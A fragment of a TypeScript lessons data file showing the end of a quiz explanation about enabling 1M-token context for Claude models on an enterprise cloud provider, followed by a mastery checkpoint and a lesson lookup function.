    "explanation": "The content states: '1M context: Opus 4.6+ / Sonnet 4.6; auto-enabled for 1M variants, else append `[1m]` to a manually pinned ID.' When the model is manually pinned (not an auto-selected 1M variant), the `[1m]` suffix must be appended to the model ID. Option A is wrong: there is no `ANTHROPIC_VERTEX_LARGE_CONTEXT` env var documented. Option B is wrong: the `global` region is actually preferred and the documentation does not say 1M context requires a non-global region. Option D is wrong: while higher rate limits may require Google Cloud support, the mechanism for enabling 1M context itself is the model ID suffix, not a quota form."
   }
  ],
  "masteryCheckpoint": "You can explain the concepts of Enterprise providers & gateways."
 }
];
export function lessonById(id: string): Lesson | undefined { return LESSONS.find((l) => l.id === id); }
